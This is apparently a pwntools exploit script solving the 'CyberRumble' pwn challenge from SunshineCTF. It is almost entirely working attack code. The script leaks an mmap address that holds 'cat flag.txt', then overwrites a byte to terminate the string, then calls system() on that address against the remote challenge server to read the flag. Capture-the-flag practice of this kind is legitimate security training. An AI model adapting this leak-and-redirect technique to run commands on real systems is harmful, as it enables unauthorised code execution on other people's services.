from pwn import *

context.log_level = 'debug'
#r = process('./CyberRumble')
r = remote('rumble.sunshinectf.org', 4300)

rr = lambda x: r.recvuntil(str(x))
ss = lambda x: r.sendline(str(x))

# stage 1 : leak mmap address where `cat flag.txt` is stored
p1 = 'old_school '
p1 += 'a' * (0xa-len(p1)+2)
p1 += 'cat flag.txt'

rr('?\n')
ss(p1)
leak = (int((rr('.').split(' ')[-1])[:-1],16))
rr('?\n')
ss('a')
log.info('leak : 0x%x' % leak)

# stage 2 : overwrite 8th byte of rdi to \x00  when system() called in stage 3
p2 = 'old_school '
p2 += 'a' * (0xa-len(p2))
p2 += 'B' * 6   

rr('?\n')
ss(p2)
rr('?\n')
ss('b')

# stage 3 : call system() with rdi which indicate `cat flag.txt`
p3 = 'last_ride '
p3 += p64(leak+1) 

rr('?\n')
ss(p3)

r.interactive()
